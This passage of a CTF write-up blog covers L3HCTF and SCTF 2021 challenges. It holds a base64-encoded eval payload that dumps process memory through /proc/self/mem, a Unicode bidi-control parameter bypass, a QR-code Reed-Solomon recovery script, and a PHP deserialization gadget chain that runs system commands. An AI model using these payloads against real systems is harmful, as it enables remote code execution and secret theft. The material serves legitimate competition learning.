<p><a href="https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/">https://whoamianony.top/2021/06/09/Web%E5%AE%89%E5%85%A8/Proc%20%E7%9B%AE%E5%BD%95%E5%9C%A8%20CTF%20%E4%B8%AD%E7%9A%84%E5%A6%99%E7%94%A8/</a></p>
<p><a href="https://xz.aliyun.com/t/10579">https://xz.aliyun.com/t/10579</a></p>
</blockquote>
<p>第一反应是读fd，看看文件的符号链接，如果fopen了，但没fclose就有可能在fd里找到，本地一试发现没有。</p>
<p>于是考虑利用别的，比如<code>./exe</code>，是一个ELF文件，但可惜<code>strings ./exe</code>没用，因为flag变量是在运行时读取的，生成elf是不存在这个字符串的，于是就读<code>./mem</code>，<code>/proc/&#123;PID&#125;/mem</code>是可用于访问进程的内存的页面。但是发现读取失败了，报错如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat mem: Input/output error</span><br></pre></td></tr></table></figure>
<p>搜到了解释原因：<a href="https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux">https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux</a></p>
<p><code>/proc/$pid/mem</code>显示$pid 内存的内容与进程中的映射方式相同，即伪文件中偏移<em>x</em>处的字节与进程中地址<em>x</em>处的字节相同。如果在进程中未映射地址，则从文件中的相应偏移量读取返回<code>EIO</code>（输入/输出错误）。例如，由于进程中的第一页永远不会被映射（因此取消引用<code>NULL</code>指针会完全失败，而不是无意中访问实际内存），因此读取 的第一个字节<code>/proc/$pid/mem</code>总是会产生 I/O 错误。</p>
<p>同时也拿到了一份用python拿内存信息的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">maps_file = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">mem_file = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/mem&quot;</span>, <span class="string">&#x27;rb&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">output_file = <span class="built_in">open</span>(<span class="string">&quot;self.dump&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> maps_file.readlines():  <span class="comment"># for each mapped region</span></span><br><span class="line">    m = re.match(<span class="string">r&#x27;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m.group(<span class="number">3</span>) == <span class="string">&#x27;r&#x27;</span>:  <span class="comment"># if this is a readable region</span></span><br><span class="line">        start = <span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(m.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        mem_file.seek(start)  <span class="comment"># seek to region start</span></span><br><span class="line">        chunk = mem_file.read(end - start)  <span class="comment"># read region contents</span></span><br><span class="line">        output_file.write(chunk)  <span class="comment"># dump contents to standard output</span></span><br><span class="line">maps_file.close()</span><br><span class="line">mem_file.close()</span><br><span class="line">output_file.close()</span><br></pre></td></tr></table></figure>
<p>我盲猜flag就在内存里，但我也不是打二进制的，也不知道在哪，于是就打算把整个chunk全部正则匹配即可。</p>
<p>把上述代码翻译成php，修改部分内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$maps_file</span> = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="variable">$mem_file</span> = fopen(<span class="string">&quot;/proc/self/mem&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(! feof(<span class="variable">$maps_file</span>)) &#123;</span><br><span class="line">    <span class="variable">$line</span> = fgets(<span class="variable">$maps_file</span>);<span class="comment">//fgets()函数从文件指针中读取一行</span></span><br><span class="line">    <span class="variable">$m</span> = preg_match(<span class="string">&quot;/([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])/&quot;</span>, <span class="variable">$line</span>, <span class="variable">$match</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$match</span>[<span class="number">3</span>] == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$start</span> = hexdec(<span class="variable">$match</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$end</span> = hexdec(<span class="variable">$match</span>[<span class="number">2</span>]);</span><br><span class="line">        fseek(<span class="variable">$mem_file</span>, <span class="variable">$start</span>);</span><br><span class="line">        <span class="variable">$chunk</span> = fread(<span class="variable">$mem_file</span>, <span class="variable">$end</span> - <span class="variable">$start</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag\&#123;.*\&#125;/&quot;</span>, <span class="variable">$chunk</span>)) &#123;</span><br><span class="line">            preg_match(<span class="string">&quot;/(flag\&#123;.*\&#125;)/&quot;</span>, <span class="variable">$chunk</span>, <span class="variable">$ans</span>);</span><br><span class="line">            var_dump(<span class="variable">$ans</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$maps_file</span>);</span><br><span class="line">fclose(<span class="variable">$mem_file</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后用base64+urlencode传参（有了安洵杯的教训，base64一定要编码），最终payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5b599005-3dfe-44e4-ac13-96fc3b194f3e.nssctf.neusoft.edu.cn/?eval=eval(base64_decode(%22JG1hcHNfZmlsZSA9IGZvcGVuKCIvcHJvYy9zZWxmL21hcHMiLCAiciIpOwokbWVtX2ZpbGUgPSBmb3BlbigiL3Byb2Mvc2VsZi9tZW0iLCAicmIiKTsKd2hpbGUoISBmZW9mKCRtYXBzX2ZpbGUpKSB7CiAgICAgICAgJGxpbmUgPSBmZ2V0cygkbWFwc19maWxlKTsvL2ZnZXRzKCnlh73mlbDku47mlofku7bmjIfpkojkuK3or7vlj5bkuIDooYwKICAgICAgICAgICAgJG0gPSBwcmVnX21hdGNoKCIvKFswLTlBLUZhLWZdKyktKFswLTlBLUZhLWZdKykgKFstcl0pLyIsICRsaW5lLCAkbWF0Y2gpOwogICAgICAgICAgICBpZigkbWF0Y2hbM10gPT0gJ3InKSB7CiAgICAgICAgICAgICAgICAgICAgJHN0YXJ0ID0gaGV4ZGVjKCRtYXRjaFsxXSk7CiAgICAgICAgICAgICAgICAgICAgICAgICRlbmQgPSBoZXhkZWMoJG1hdGNoWzJdKTsKICAgICAgICAgICAgICAgICAgICAgICAgZnNlZWsoJG1lbV9maWxlLCAkc3RhcnQpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGNodW5rID0gZnJlYWQoJG1lbV9maWxlLCAkZW5kIC0gJHN0YXJ0KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHByZWdfbWF0Y2goIi9mbGFnXHsuKlx9LyIsICRjaHVuaykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZWdfbWF0Y2goIi8oZmxhZ1x7LipcfSkvIiwgJGNodW5rLCAkYW5zKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyX2R1bXAoJGFucyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KfQpmY2xvc2UoJG1hcHNfZmlsZSk7CmZjbG9zZSgkbWVtX2ZpbGUpOw%3D%3D%22));</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/09/%E6%9A%97%E6%B3%89%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%A1%A5%E9%A2%98wp/assets/image-20211209151159749.png" alt="image-20211209151159749"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>L3HCTF&amp;SCTF2021部分wp</title>
    <url>/2022/01/09/L3HCTF-SCTF2021/</url>
    <content><![CDATA[<p>期末考试基本考完了，分还没出，但是这学期课内学的时长就能提前预知到出分后的痛苦了。无论如何，要把之前欠的两次XCTF联赛的题解补上。</p>
<span id="more"></span>
<h2 id="L3HCTF2021"><a href="#L3HCTF2021" class="headerlink" title="L3HCTF2021"></a>L3HCTF2021</h2><p>or4nge战队获得了第21名的好成绩！</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110001421778.png" alt="image-20220110001421778"></p>
<p>在这比赛先看了看cover那道java，找到一个json点，但可惜真的不会java，image service又是go的逆向，看着就难受，就去和pill0w师傅去看别的题了，做了一个其他的web和misc。</p>
<h3 id="Easy-PHP"><a href="#Easy-PHP" class="headerlink" title="Easy PHP"></a>Easy PHP</h3><p>看了题，这难道不是学ctf第一天的题？？正常payload打过去显然不通，肯定有问题，疑点在于这个配色显然不对劲。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110183943241.png" alt="image-20220110183943241"></p>
<p>复制下来发现有特殊字符，那么问题显然出在这里：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110185600732.png" alt="image-20220110185600732"></p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110190636418.png" alt="image-20220110190636418"></p>
<p>RLO，LRI，PDI这三种特殊unicode控制字符，粘贴到vscode上能显示出这都是\u2066,\u202E,\u2069</p>
<p>\u202E会将字符串进行翻转，但是怎么翻的具体优先级还是很离谱，注意到这段话有12个unicode，其中每4个分为一组，分别是\u202e,\u2066,\u2069,\u2066,那我完全可以把\u202e+\u2066+str+\u2069+\u2066理解为一个新的str，拼起来就好了。</p>
<p>最终payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;‮⁦L3H⁩⁦password=‮⁦CTF⁩⁦l3hctf</span><br></pre></td></tr></table></figure>
<p>博客复制上去可能会丢失字符，直接看截图吧：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110185710546.png" alt="image-20220110185710546"></p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110190329651.png" alt="image-20220110190329651"></p>
<p>看了flag发现还是一个CVE，我直接震惊（不过知道了这技巧是不是就可以发一些话绕过bot的检测了）</p>
<h3 id="cropped"><a href="#cropped" class="headerlink" title="cropped"></a>cropped</h3><p>(由于比赛wp鸽了俩月，浏览器记录被清理了，很多中间过程全部丢失，我现在在凭印象写题)</p>
<p>题目很简单，给了一个裁了一半多的二维码，让你还原，但可惜我对二维码一无所知，传唤misc手来也不是很懂，但可惜没有别的会的题了，那就硬啃二维码的原理，一定能啃出来。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110003634691.png" alt="image-20220110003634691"></p>
<p>这里推荐一些好用的学习资料：</p>
<p><a href="https://merricx.github.io/qrazybox/">https://merricx.github.io/qrazybox/</a> 在线绘图，还能自动分析，超级好用</p>
<p><a href="https://coolshell.cn/articles/10590.html">https://coolshell.cn/articles/10590.html</a> 二维码的生成原理与细节</p>
<p><a href="https://www.swisseduc.ch/informatik/theoretische_informatik/qr_codes/docs/qr_standard.pdf">https://www.swisseduc.ch/informatik/theoretische_informatik/qr_codes/docs/qr_standard.pdf</a> 官方文档，一个大pdf</p>
<p><a href="https://www.thonky.com/qr-code-tutorial/error-correction-coding">https://www.thonky.com/qr-code-tutorial/error-correction-coding</a> 一个手把手教你画二维码的过程</p>
<p>在qrazybox上分析出这是一个33*33的二维码，属于V4，根据图片左上角的信息能推断出这个二维码是L级纠错，掩码类型是2。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110131139527.png" alt="image-20220110131139527"></p>
<p>从官方文档得知，这是L级纠错码，只能恢复7%的codeword。（最低级纠错码，感受到出题人的恶意了。）</p>
<p>然后我们继续分析V4二维码的结构：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110144013602.png" alt="image-20220110144013602"></p>
<p>像这个就是一个纠错登记非常高的二维码，右边的部分是数据部分，左边是纠错部分，每一个块包含8个格，也就是8bit，一个字节。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110152632050.png" alt="image-20220110152632050"></p>
<p>在线网站为我们的纠错码部分分了块，估计是右边缺的数据太多，无法分清了，虽然格式是固定的。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110153402640.png" alt="image-20220110153402640"></p>
<p>参考这张V3的图，我们往上填的就是类似这种的，从右下角出发，zig-zag的走，如果遇到非数据区，就绕开或者跳过。在碰壁的时候需要横着走4步。</p>
<p>然后我们需要分析数据区的编码方式了，二维码支持数字编码，字符编码，字节编码，日文编码什么的，位于官方手册的P24页：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110155731738.png" alt="image-20220110155731738"></p>
<p>然后这个题的话根据题目信息应该是字符信息，要么是字符就是字节，继续阅读，发现方式如下：mode indicators+长度+内容+padding。其中mode indicators长度为4bit，也就是说</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110160042655.png" alt="image-20220110160042655"></p>
<p>右下角一个4个格，接下来8个格是长度，接下来每八个格就是具体内容了，我们从如下内容中能否获取关键信息呢？</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110160158864.png" alt="image-20220110160158864"></p>
<p>每个块中间截后一半和下一个的前一半拼起来算ascii码，能发现神奇的东西：看到了http  github l3hctf </p>
<p>结合题目信息，是把flag放在一个代码片段，就联想到了gist.github这个东西，自己尝试一下：</p>
<p>发现网址形如这种形式：<code>https://gist.github.com/FYHSSGSS/59a4d122d44865b0b29d4cc51f9a258c</code>，域名后面跟着自己的用户名，之后是32位16进制。</p>
<p>所以这个二维码的内容就形如：<code>https://gist.github.com/L3HCTF/********************************</code>,生成一个类似的二维码抄作业，得到这样的二维码：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110163017430.png" alt="image-20220110163017430"></p>
<p>其中中下部分每个块我都填了一个1，因为都是ascii码，第一位肯定是0。</p>
<p>接下来是padding部分，阅读官方手册，发现就是重复下面的两个bytes：11101100 00010001，网站已经智能把padding部分给我们留出来了，直接填就好。</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110163714678.png" alt="image-20220110163714678"></p>
<p>可以看到这个二维码的基本已经快出来了，但只是看上去快出来的，但是最关键的中下部分的部分字符我们还是不得而知。</p>
<p><code>https://gist.github.com/L3HCTF/9*******4fdbba26********cad7d71e</code>，还有15个字符，硬爆显然不可能，我们需要针对左边剩余的纠错码进行尽可能的纠错。</p>
<p>然后跑去学纠错原理了，这里用的是里德-所罗门码，（赶紧回去翻上学期的信息论ppt简单复习一下纠错码的原理），纠错具体过程我跟了博客全程走了一遍，大约原理就是一个系数满足$GF(2^8)$的伽罗华域上运算的多项式环上的运算，做大除法什么的取余数什么的，过程细节即为恶心，我当时真的害怕不会是让我纯手撸一份这个代码吧，但也是有不少的爆破量，对于L级别的纠错来说还是太难了。</p>
<p>这时候就搜到了一个 reedsolo 的python库，太好了不用再重复造轮子了。</p>
<p>前往官网学习一下这个库的用法：<a href="https://pypi.org/project/reedsolo/">https://pypi.org/project/reedsolo/</a></p>
<p>经测试发现，这个纠错能力好像远远大于二维码本身的纠错能力，允许出错的字节数只要小于等于纠错码的数量就能恢复出来。</p>
<p>数了一下，我们有25个不确定的块，所以我们只需要爆破那5个块恢复即可，当然有可能爆破有问题，恢复出来的网址是不可见字符，所以只要爆出全为不可见字符，并且范围均在0123456789abcdef之间即为答案。</p>
<p>本来应该爆的很快的，但是我写代码的时候已经神志不清了，之前做了一些优化剪枝觉得有问题，全给删了，采用的是最暴力的爆法，同时开了4个进程然后跑去睡觉了，睡了15分钟再来看发现就出了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">letter = <span class="string">&quot;1234567890abcdef&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span>(<span class="params">payload</span>):</span></span><br><span class="line">    <span class="keyword">import</span> reedsolo</span><br><span class="line"></span><br><span class="line">    reedsolo.init_tables(<span class="number">0x11d</span>)</span><br><span class="line"></span><br><span class="line">    qr_bytes = payload.split()</span><br><span class="line"></span><br><span class="line">    b = <span class="built_in">bytearray</span>()</span><br><span class="line">    erasures = []</span><br><span class="line">    <span class="keyword">for</span> i, bits <span class="keyword">in</span> <span class="built_in">enumerate</span>(qr_bytes):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> bits:</span><br><span class="line">            erasures.append(i)</span><br><span class="line">            b.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b.append(<span class="built_in">int</span>(bits, <span class="number">2</span>))</span><br><span class="line">    mes, ecc, errata_pos = reedsolo.rs_correct_msg(b, <span class="number">20</span>, erase_pos=erasures)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(mes):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">79</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">38</span> <span class="keyword">or</span> i == <span class="number">39</span> <span class="keyword">or</span> i == <span class="number">37</span> <span class="keyword">or</span> i == <span class="number">55</span> <span class="keyword">or</span> \</span><br><span class="line">                i == <span class="number">54</span> <span class="keyword">or</span> i == <span class="number">48</span> <span class="keyword">or</span> i == <span class="number">49</span> <span class="keyword">or</span> i == <span class="number">50</span>\</span><br><span class="line">                <span class="keyword">or</span> i == <span class="number">51</span> <span class="keyword">or</span> i == <span class="number">52</span> <span class="keyword">or</span> i == <span class="number">53</span>:</span><br><span class="line">            first = <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c)[<span class="number">4</span>:]</span><br><span class="line">            second = <span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(mes[i + <span class="number">1</span>])[<span class="number">4</span>:]</span><br><span class="line">            mix = <span class="built_in">chr</span>(<span class="built_in">int</span>(first + second, <span class="number">2</span>))</span><br><span class="line">            <span class="keyword">if</span> mix <span class="keyword">not</span> <span class="keyword">in</span> letter:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;!!!!&#x27;</span>)</span><br><span class="line">    fout = <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> mes:</span><br><span class="line">        fout.write(<span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">        fout.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;:08b&#125;&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">    <span class="built_in">print</span>(errata_pos)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>():</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&#x27;data2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    L = <span class="built_in">eval</span>(fp.readline())</span><br><span class="line">    <span class="keyword">return</span> L</span><br><span class="line"></span><br><span class="line">init_payload = pre()</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> letter:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> letter:</span><br><span class="line">                    ii = <span class="built_in">bin</span>(<span class="built_in">ord</span>(a))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    jj = <span class="built_in">bin</span>(<span class="built_in">ord</span>(b))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    kk = <span class="built_in">bin</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    ll = <span class="built_in">bin</span>(<span class="built_in">ord</span>(d))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    mm = <span class="built_in">bin</span>(<span class="built_in">ord</span>(e))[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                    now_payload = init_payload</span><br><span class="line">                    now_payload[<span class="number">33</span>] = <span class="string">&#x27;1001&#x27;</span> + ii[:<span class="number">4</span>]</span><br><span class="line">                    now_payload[<span class="number">34</span>] = ii[<span class="number">4</span>:] + jj[:<span class="number">4</span>]</span><br><span class="line">                    now_payload[<span class="number">35</span>] = jj[<span class="number">4</span>:] + kk[:<span class="number">4</span>]</span><br><span class="line">                    now_payload[<span class="number">36</span>] = kk[<span class="number">4</span>:] + ll[:<span class="number">4</span>]</span><br><span class="line">                    now_payload[<span class="number">37</span>] = ll[<span class="number">4</span>:] + mm[:<span class="number">4</span>]</span><br><span class="line">                    now_payload[<span class="number">38</span>] = mm[:<span class="number">4</span>] + <span class="string">&#x27;0???&#x27;</span></span><br><span class="line">                    payload = <span class="string">&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>):</span><br><span class="line">                        payload += now_payload[i] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                    payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80</span>,<span class="number">100</span>):</span><br><span class="line">                        payload += now_payload[i] + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                    <span class="comment"># print(payload)</span></span><br><span class="line">                    cnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> cnt % <span class="number">10000</span> == <span class="number">0</span>:</span><br><span class="line">                        <span class="built_in">print</span>(cnt)</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        work(payload)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>把拿到的数据库块翻译成网址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;res.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fp.readlines():</span><br><span class="line">    line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    output += <span class="string">&#x27;&quot;&#x27;</span> + line + <span class="string">&#x27;&quot;,&#x27;</span></span><br><span class="line">    ans += line</span><br><span class="line">ans = ans[<span class="number">12</span>:]</span><br><span class="line">new_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ans) // <span class="number">8</span>):</span><br><span class="line">    tmp = ans[i * <span class="number">8</span>: i * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">    new_list.append(tmp)</span><br><span class="line">unknown = <span class="number">0</span></span><br><span class="line">ans = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(new_list):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;?&#x27;</span> <span class="keyword">in</span> c:</span><br><span class="line">        unknown += c.count(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(i, c, <span class="string">&quot;error&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i, c, <span class="built_in">chr</span>(<span class="built_in">int</span>(c, <span class="number">2</span>)))</span><br><span class="line">    ans += <span class="built_in">chr</span>(<span class="built_in">int</span>(c, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>
<p>得到网址：</p>
<p><code>https://gist.github.com/L3HCTF/9a68efd54fdbba26372d0842cad7d71e</code>,进去就是flag。</p>
<p>哦对了，最后二维码长这样：</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110170444794.png" alt="image-20220110170444794"></p>
<p>拿了个三血，跟二血就差一点，我的我的</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110170401290.png" alt="image-20220110170401290"></p>
<h2 id="SCTF2021"><a href="#SCTF2021" class="headerlink" title="SCTF2021"></a>SCTF2021</h2><p>or4nge战队获得了第14名的好成绩！</p>
<p><img src="/2022/01/09/L3HCTF-SCTF2021/assets/image-20220110001459745.png" alt="image-20220110001459745"></p>
<p>先附上我们官方的wp：<a href="https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/">https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</a></p>
<h3 id="Upload-it"><a href="#Upload-it" class="headerlink" title="Upload it"></a>Upload it</h3><p>可以任意上传/tmp目录下文件， 一开始没什么思路，但是利用给的<code>Composer.json</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &quot;symfony/string&quot;: &quot;^5.3&quot;,</span><br><span class="line"></span><br><span class="line">&quot;opis/closure&quot;: &quot;^3.6&quot;</span><br></pre></td></tr></table></figure>
<p>结合出题人发布的文章<a href="https://www.anquanke.com/post/id/217929#h2-3">https://www.anquanke.com/post/id/217929#h2-3</a>找到一条链，其中lazystring的任意无参数函数调用接的是闭包函数<code>__invoke</code>，可以将闭包函数序列化进去。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">require</span> &quot;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">FYHSSGSS</span>\<span class="title">Documents</span>\<span class="title">University</span>\<span class="title">CTF</span>\\<span class="title">race</span>\\2021<span class="title">SCTF</span>\<span class="title">Upload_it</span>\\<span class="title">vendor</span>\<span class="title">autoload</span>.<span class="title">php</span>&quot;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LazyString</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$value</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$func</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&quot;cat /flag&quot;</span>);&#125;;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$func</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;value = <span class="variable">$d</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string=<span class="keyword">new</span> LazyString;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">exp</span>=<span class="title">print</span>(<span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>())));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
